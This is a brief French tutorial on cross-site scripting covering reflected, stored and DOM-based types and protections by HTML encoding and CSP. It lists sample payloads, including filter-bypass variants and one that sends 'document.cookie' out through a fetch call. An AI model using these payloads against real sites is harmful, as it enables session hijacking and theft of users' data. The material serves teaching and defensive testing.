# Cross-Site Scripting (XSS)

## Types d’XSS
- **Reflected XSS** : payload envoyé dans l’URL et réfléchi dans la réponse.  
- **Stored XSS** : payload persistant stocké dans la base de données.  
- **DOM-based XSS** : injection via manipulation du DOM côté client.

## Payloads courants
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```
- **Bypass** : `<svg/onload=alert('XSS')>`  
- **Polyglot** : `"><script>fetch('/steal?c='+document.cookie)</script>`

### Exemple Reflected
URL : `http://vuln.com/search?q=<script>alert(1)</script>`

### Protection
- Encodage HTML (`&lt;`, `&gt;`)  
- Content Security Policy (CSP)

---
